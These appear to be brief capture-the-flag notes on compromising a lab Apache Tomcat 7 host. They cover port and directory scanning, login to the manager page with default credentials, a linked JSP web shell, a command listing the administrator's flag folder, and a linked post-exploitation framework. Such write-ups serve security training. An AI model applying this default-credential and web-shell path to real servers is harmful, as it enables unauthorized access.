Run an nmap scan of target

```php
nmap -A -sV -Pn 10.129.136.9

8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1

```

Our points of interest
Were interested in this Apache server that could be hosting some kind of app

Run a `gobuster` and `ffuf` scan on the target

```php
ffuf -u http://10.129.136.9:8080/FUZZ -w /home/drew/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -fc 404

gobuster dir -u http://10.129.136.9:8080 -w /home/drew/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --no-error
```

Our points of interest
`http://10.129.136.9:8080/` - default web page for `Apache Tomcat/7.0.88`
`http://10.129.136.9:8080/docs/` - documentation page for `Apache Tomcat`
`http://10.129.136.9:8080/manager` - this is what we want

We find a login prompt to authenticate, we have no credentials so lets first try some default ones and see what hits.

```
conf/tomcat-users.xml in your installation. That file must contain the credentials to let you use this webapp.
```

```php
https://gist.github.com/0xRar/70aae102af56495b7be51486d363c4bd
tomcat : s3cret
```

```php
http://10.129.136.9:8080/manager/html/start?path=/&org.apache.catalina.filters.CSRF_NONCE=3A9BC6E251392AA7A004501412F55376
```


```
https://github.com/SecurityRiskAdvisors/cmd.jsp.git
```

```
cmd /c dir \users\administrator\desktop\flags

```

```
https://github.com/byt3bl33d3r/SILENTTRINITY
```